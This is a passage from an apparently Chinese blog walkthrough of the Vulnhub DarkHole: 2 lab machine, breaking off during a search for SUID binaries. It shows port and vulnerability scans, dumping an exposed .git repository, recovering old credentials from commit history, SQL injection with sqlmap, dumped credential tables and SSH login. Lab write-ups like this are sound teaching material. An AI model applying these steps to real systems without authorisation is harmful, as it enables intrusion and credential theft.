{"pageProps":{"postData":{"id":"VulnhubDarkHole 2","contentHtml":"<h1>DarkHole: 2</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/darkhole-2,740/\">https://www.vulnhub.com/entry/darkhole-2,740/</a></p>\n</blockquote>\n<h2>端口扫描主机发现</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>185</code>是靶机</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\"># nmap -sP 192.168.75.0/24                 </span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-08 18:02 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00036</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00030</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.185</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00028</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">1</span>E:D3:<span class=\"hljs-title function_ invoke__\">AD</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00033</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FE:CA:<span class=\"hljs-number\">7</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>探测主机所有开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.185</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-08 18:03 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.185</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00040</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">1</span>E:D3:<span class=\"hljs-title function_ invoke__\">AD</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>探测服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.185</span>    \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-08 18:04 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.185</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00067</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">8.2</span>p1 Ubuntu <span class=\"hljs-number\">4</span>ubuntu0.<span class=\"hljs-number\">3</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">41</span> ((Ubuntu))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">1</span>E:D3:<span class=\"hljs-title function_ invoke__\">AD</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">4</span>.X|<span class=\"hljs-number\">5</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-08 <span class=\"hljs-number\">18</span>:05 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00078</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n| http-git: \n|   <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>:<span class=\"hljs-number\">80</span>/.git/\n|     Git repository found!\n|     Repository description: Unnamed repository; edit this file <span class=\"hljs-string\">'description'</span> to name the...\n|_    Last commit message: i changed login.php file <span class=\"hljs-keyword\">for</span> more secure \n|_http-vuln-cve2017-<span class=\"hljs-number\">1001000</span>: ERROR: Script execution failed (use -d to debug)\n| http-csrf: \n| Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>:<span class=\"hljs-number\">80</span>/login.php\n|     Form <span class=\"hljs-built_in\">id</span>: email\n|_    Form action: \n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|       httponly flag <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span>\n|   /login.php: \n|     PHPSESSID: \n|_      httponly flag <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span>\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.\n| http-enum: \n|   /login.php: Possible admin folder\n|   /.git/HEAD: Git folder\n|   /config/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.41 (ubuntu)'</span>\n|   /js/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.41 (ubuntu)'</span>\n|_  /style/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.41 (ubuntu)'</span>\n</code></pre>\n<p>找到<code>.git</code> ，可能存在源码泄露</p>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>访问主页，存在登陆页面连接</p>\n<p><img src=\"/post-images/VulnhubDarkHole%202/image76.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>扫描目录</p>\n<pre><code class=\"hljs language-python\">dirsearch -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span> -x <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span>\n//\n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">11</span>] <span class=\"hljs-number\">301</span> -  313B  - /js  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>/js/                                             \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">301</span> -  315B  - /.git  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>/.git/                                         \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -  600B  - /.git/                                                                         \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -   41B  - /.git/COMMIT_EDITMSG      \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -   73B  - /.git/description                                                              \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -   23B  - /.git/HEAD                \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -  674B  - /.git/hooks/              \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -  130B  - /.git/config                                                                   \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -    1KB - /.git/index                                                                    \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -  460B  - /.git/info/                                                                    \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -  240B  - /.git/info/exclude        \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -  485B  - /.git/logs/                                                                    \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -  554B  - /.git/logs/HEAD           \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">301</span> -  331B  - /.git/logs/refs/heads  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>/.git/logs/refs/heads/\n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -  554B  - /.git/logs/refs/heads/master                                                   \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -  669B  - /.git/objects/                                                                 \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">301</span> -  325B  - /.git/logs/refs  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>/.git/logs/refs/                     \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -   41B  - /.git/refs/heads/master                                                        \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">301</span> -  326B  - /.git/refs/heads  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>/.git/refs/heads/                   \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">301</span> -  325B  - /.git/refs/tags  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>/.git/refs/tags/                     \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -  465B  - /.git/refs/               \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">5</span>10B  - /.idea/                                                                        \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">301</span> -  316B  - /.idea  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>/.idea/                                       \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -  192B  - /.idea/modules.xml                                                             \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -  926B  - /.idea/workspace.xml                                                           \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">32</span>] <span class=\"hljs-number\">301</span> -  317B  - /config  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>/config/                                     \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">33</span>] <span class=\"hljs-number\">200</span> -  457B  - /config/                                                                       \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">34</span>] <span class=\"hljs-number\">200</span> -   11B  - /dashboard.php                                                                 \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">43</span>] <span class=\"hljs-number\">200</span> -  456B  - /js/                                                                           \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">200</span> -  484B  - /login.php                                                                     \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">46</span>] <span class=\"hljs-number\">302</span> -    0B  - /logout.php  ->  index.php                                                     \n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">12</span>:03] <span class=\"hljs-number\">301</span> -  316B  - /style  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>/style/\n</code></pre>\n<ul>\n<li>清一色的<code>.git</code> 可以尝试有没有<code>.git</code>源码泄露</li>\n<li><code>config/</code> 应该是配置文件</li>\n</ul>\n</li>\n<li>\n<p>测试是否存在源码泄露</p>\n<blockquote>\n<p><a href=\"https://www.freebuf.com/articles/web/346607.html\">https://www.freebuf.com/articles/web/346607.html</a></p>\n</blockquote>\n<p>因为我们找到了<code>.git</code> ,所以我们要针对<code>git</code></p>\n<ul>\n<li>\n<p>访问<code>/.git/config</code> 存在该目录，存在源码泄露漏洞</p>\n<pre><code class=\"hljs language-python\">[core]\n\trepositoryformatversion = <span class=\"hljs-number\">0</span>\n\tfilemode = false\n\tbare = false\n\tlogallrefupdates = true\n\tsymlinks = false\n\tignorecase = true\n</code></pre>\n</li>\n<li>\n<p>使用工具 <strong><code>git-dumper</code></strong></p>\n<blockquote>\n<p><a href=\"https://github.com/arthaud/git-dumper\">https://github.com/arthaud/git-dumper</a></p>\n</blockquote>\n<p>使用<code>pip install git-dumper</code> 安装</p>\n<pre><code class=\"hljs language-python\">git-dumper http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>/.git/ ./<span class=\"hljs-number\">185</span>\n</code></pre>\n<p>将所有源码文件下载下来了，下载到当前目录的<code>185</code>文件夹里</p>\n<pre><code class=\"hljs language-python\">ls -al ./<span class=\"hljs-number\">185</span>\n//\ndrwxr-xr-x <span class=\"hljs-number\">7</span> root root <span class=\"hljs-number\">4096</span> <span class=\"hljs-number\">11</span>月 <span class=\"hljs-number\">9</span>日 01:<span class=\"hljs-number\">25</span> .\ndrwxr-xr-x <span class=\"hljs-number\">4</span> root root <span class=\"hljs-number\">4096</span> <span class=\"hljs-number\">11</span>月 <span class=\"hljs-number\">9</span>日 01:<span class=\"hljs-number\">41</span> ..\ndrwxr-xr-x <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> <span class=\"hljs-number\">11</span>月 <span class=\"hljs-number\">9</span>日 01:<span class=\"hljs-number\">25</span> config\n-rw-r--r-- <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">5578</span> <span class=\"hljs-number\">11</span>月 <span class=\"hljs-number\">9</span>日 01:<span class=\"hljs-number\">25</span> dashboard.php\ndrwxr-xr-x <span class=\"hljs-number\">7</span> root root <span class=\"hljs-number\">4096</span> <span class=\"hljs-number\">11</span>月 <span class=\"hljs-number\">9</span>日 01:<span class=\"hljs-number\">25</span> .git\ndrwxr-xr-x <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> <span class=\"hljs-number\">11</span>月 <span class=\"hljs-number\">9</span>日 01:<span class=\"hljs-number\">25</span> .idea\n-rw-r--r-- <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">1094</span> <span class=\"hljs-number\">11</span>月 <span class=\"hljs-number\">9</span>日 01:<span class=\"hljs-number\">25</span> index.php\ndrwxr-xr-x <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> <span class=\"hljs-number\">11</span>月 <span class=\"hljs-number\">9</span>日 01:<span class=\"hljs-number\">25</span> js\n-rw-r--r-- <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">1493</span> <span class=\"hljs-number\">11</span>月 <span class=\"hljs-number\">9</span>日 01:<span class=\"hljs-number\">25</span> login.php\n-rw-r--r-- <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">179</span> <span class=\"hljs-number\">11</span>月 <span class=\"hljs-number\">9</span>日 01:<span class=\"hljs-number\">25</span> logout.php\ndrwxr-xr-x <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> <span class=\"hljs-number\">11</span>月 <span class=\"hljs-number\">9</span>日 01:<span class=\"hljs-number\">25</span> style\n</code></pre>\n</li>\n</ul>\n</li>\n</ol>\n<h2>代码审计</h2>\n<p>上面已将源码文件下载了，现在开始要代码审计</p>\n<ol>\n<li>\n<p><code>config.php</code>文件，是数据库配置文件，用户名为<code>root</code>但是密码为<code>空</code></p>\n<pre><code class=\"hljs language-python\">&#x3C;?php\n$connect = new mysqli(<span class=\"hljs-string\">\"localhost\"</span>,<span class=\"hljs-string\">\"root\"</span>,<span class=\"hljs-string\">\"\"</span>,<span class=\"hljs-string\">\"darkhole_2\"</span>);\n</code></pre>\n</li>\n<li>\n<p><code>login.php</code></p>\n<pre><code class=\"hljs language-python\">&#x3C;?php                                                                                                                                                                                                             \nsession_start();                                                                                                                                                                                                  \nrequire <span class=\"hljs-string\">'config/config.php'</span>;                                                                                                                                                                                      \n<span class=\"hljs-keyword\">if</span>($_SERVER[<span class=\"hljs-string\">'REQUEST_METHOD'</span>] == <span class=\"hljs-string\">'POST'</span>){                                                                                                                                                                         \n    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST[<span class=\"hljs-string\">'email'</span>]));                                                                                                                               \n    $<span class=\"hljs-keyword\">pass</span> = mysqli_real_escape_string($connect,htmlspecialchars($_POST[<span class=\"hljs-string\">'password'</span>]));                                                                                                                             \n    $check = $connect->query(<span class=\"hljs-string\">\"select * from users where email='$email' and password='$pass' and id=1\"</span>);                                                                                                           \n    <span class=\"hljs-keyword\">if</span>($check->num_rows){\n        $_SESSION[<span class=\"hljs-string\">'userid'</span>] = <span class=\"hljs-number\">1</span>;\n        header(<span class=\"hljs-string\">\"location:dashboard.php\"</span>);\n        die();\n    }\n}\n?>\n</code></pre>\n<p>应该是可以绕过的？但是我没有成功</p>\n</li>\n<li>\n<p>进入<code>185</code>文件夹查看日志（因为文件夹还留着<code>.git</code> ,所以可以使用<code>git</code>命令）</p>\n<pre><code class=\"hljs language-python\">git log\n//                                     \ncommit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -> master)\nAuthor: Jehad Alqurashi &#x3C;anmar-v7@hotmail.com>\nDate:   Mon Aug <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">32</span> <span class=\"hljs-number\">2021</span> +0300\n\n    i changed login.php file <span class=\"hljs-keyword\">for</span> more secure\n\ncommit a4d900a8d85e8938d3601f3cef113ee293028e10\nAuthor: Jehad Alqurashi &#x3C;anmar-v7@hotmail.com>\nDate:   Mon Aug <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">13</span>:06:<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">2021</span> +0300\n\n    I added login.php file <span class=\"hljs-keyword\">with</span> default credentials\n\ncommit aa2a5f3aa15bb402f2b90a07d86af57436d64917\nAuthor: Jehad Alqurashi &#x3C;anmar-v7@hotmail.com>\nDate:   Mon Aug <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">13</span>:02:<span class=\"hljs-number\">44</span> <span class=\"hljs-number\">2021</span> +0300\n</code></pre>\n<p>出现三次提交以及作者时间等</p>\n</li>\n<li>\n<p>对比三次提交</p>\n<blockquote>\n<p><code>git diff</code> #获得当前目录上次提交和本地索引的差距,也就是你在什么地方修改了代码.</p>\n</blockquote>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># git diff 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4                                                                                                                     </span>\n<span class=\"hljs-comment\"># git diff a4d900a8d85e8938d3601f3cef113ee293028e10</span>\n\ndiff --git a/login.php b/login.php\nindex 8a0ff67.<span class=\"hljs-number\">.0904</span>b19 <span class=\"hljs-number\">100644</span>\n--- a/login.php\n+++ b/login.php\n<span class=\"hljs-meta\">@@ -<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">7</span> +<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">10</span> @@</span>\n session_start();\n require <span class=\"hljs-string\">'config/config.php'</span>;\n <span class=\"hljs-keyword\">if</span>($_SERVER[<span class=\"hljs-string\">'REQUEST_METHOD'</span>] == <span class=\"hljs-string\">'POST'</span>){\n-    <span class=\"hljs-keyword\">if</span>($_POST[<span class=\"hljs-string\">'email'</span>] == <span class=\"hljs-string\">\"lush@admin.com\"</span> &#x26;&#x26; $_POST[<span class=\"hljs-string\">'password'</span>] == <span class=\"hljs-string\">\"321\"</span>){\n+    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST[<span class=\"hljs-string\">'email'</span>]));\n+    $<span class=\"hljs-keyword\">pass</span> = mysqli_real_escape_string($connect,htmlspecialchars($_POST[<span class=\"hljs-string\">'password'</span>]));\n+    $check = $connect->query(<span class=\"hljs-string\">\"select * from users where email='$email' and password='$pass' and id=1\"</span>);\n+    <span class=\"hljs-keyword\">if</span>($check->num_rows){\n         $_SESSION[<span class=\"hljs-string\">'userid'</span>] = <span class=\"hljs-number\">1</span>;\n         header(<span class=\"hljs-string\">\"location:dashboard.php\"</span>);\n         die();\n\n</code></pre>\n<p>可以看到 <code>-    if($_POST['email'] == \"lush@admin.com\" &#x26;&#x26; $_POST['password'] == \"321\")</code></p>\n<p>出现了邮箱以及密码，可以尝试登陆后台</p>\n</li>\n<li>\n<p>使用的得到账号密码登录后台，成功进入</p>\n</li>\n</ol>\n<h2>利用后台</h2>\n<ol>\n<li>\n<p>使用的得到账号密码登录后台，成功进入后台</p>\n<p><img src=\"/post-images/VulnhubDarkHole%202/image77.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p><code>url</code>是<code>/dashboard.php?id=1</code> ，像是存在<code>sql</code>注入，可以尝试下</p>\n<pre><code class=\"hljs language-python\">/dashboard.php?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">' # 页面空白\n/dashboard.php?id=1'</span>--+ <span class=\"hljs-comment\"># 成功闭合，存在注入</span>\n</code></pre>\n<p>就不使用手工注入了，直接上<code>sqlmap</code> ，记得要想拿到<code>cookie</code> ，不然没有登陆状态</p>\n<pre><code class=\"hljs language-python\">sqlmap -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>/dashboard.php?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> --cookie PHPSESSID=n22sg8e16sjbgs2c7g7kffofmf -batch\n</code></pre>\n<p>爆出两张表 <code>users</code> 以及<code>ssh</code> ，<code>ssh</code>应该是能使用 <code>ssh</code>登录的用户，两张表的数据我们都<code>dump</code>下</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># users</span>\n+----+----------------+-------------------------------------------+----------+-----------------------------+----------------+\n| <span class=\"hljs-built_in\">id</span> | email          | address                                   | password | username                    | contact_number |\n+----+----------------+-------------------------------------------+----------+-----------------------------+----------------+\n| <span class=\"hljs-number\">1</span>  | lush@admin.com |  Street, Pincode, Province/State, Country | <span class=\"hljs-number\">321</span>      | Jehad Alqurashiasddasdasdas | <span class=\"hljs-number\">1</span>              |\n+----+----------------+-------------------------------------------+----------+-----------------------------+----------------+\n<span class=\"hljs-comment\"># ssh</span>\n+----+------+--------+\n| <span class=\"hljs-built_in\">id</span> | <span class=\"hljs-keyword\">pass</span> | user   |\n+----+------+--------+\n| <span class=\"hljs-number\">1</span>  | fool | jehad  |\n+----+------+--------+\n</code></pre>\n</li>\n<li>\n<p>我们拿<code>ssh</code>表的用户去登陆下</p>\n</li>\n</ol>\n<h2>提权 - jehad用户</h2>\n<ol>\n<li>\n<p>我们拿<code>ssh</code>表的用户去登陆下</p>\n<pre><code class=\"hljs language-python\">ssh jehad@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>                \njehad@darkhole:~$ \n</code></pre>\n<p>获得<code>shell</code>！！！</p>\n</li>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">jehad@darkhole:~$ whoami\njehad\njehad@darkhole:~$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">1001</span>(jehad) gid=<span class=\"hljs-number\">1001</span>(jehad) groups=<span class=\"hljs-number\">1001</span>(jehad)\njehad@darkhole:~$ uname -a\nLinux darkhole <span class=\"hljs-number\">5.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">81</span>-generic <span class=\"hljs-comment\">#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>寻找敏感文件</p>\n<ul>\n<li>\n<p><code>/home/losy</code> 目录下存在<code>user.txt</code> 是<code>flag</code>文件</p>\n<pre><code class=\"hljs language-python\">ehad@darkhole:/home/losy$ cat user.txt\nDarkHole{<span class=\"hljs-string\">'This_is_the_life_man_better_than_a_cruise'</span>}\n</code></pre>\n</li>\n<li>\n<p>寻找SUID文件</p>\n<pre><code class=\"hljs language-python\">jehad@darkhole:/home/losy$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f <span class=\"hljs-number\">2</span>>/dev/null                                                                                                                                   02:06:<span class=\"hljs-number\">46</span> [<span class=\"hljs-number\">3</span>/<span class=\"hljs-number\">65</span>]\n/usr/<span class=\"hljs-built_in\">bin</span>/sudo                                                                                                                                                                                                     \n/usr/<span class=\"hljs-built_in\">bin</span>/passwd                                                                                                                                                                                                   \n/usr/<span class=\"hljs-built_in\">bin</span>/chfn                                                                                                                                                                                                     \n/usr/<span class=\"hljs-built_in\">bin</span>/chsh\n/usr/<span class=\"hljs-built_in\">bin</span>/fusermount\n/usr/<span class=\"hljs-built_in\">bin</span>/gpasswd\n/usr/<span class=\"hljs-built_in\">bin</span>/pkexec\n/usr/<span class=\"hljs-built_in\">bin</span>/newgrp\n/usr/<span class=\"hljs-built_in\">bin</span>/umount\n/usr/<span class=\"hljs-built_in\">bin</span>/mount\n/usr/<span class=\"hljs-built_in\">bin</span>/su\n/usr/<span 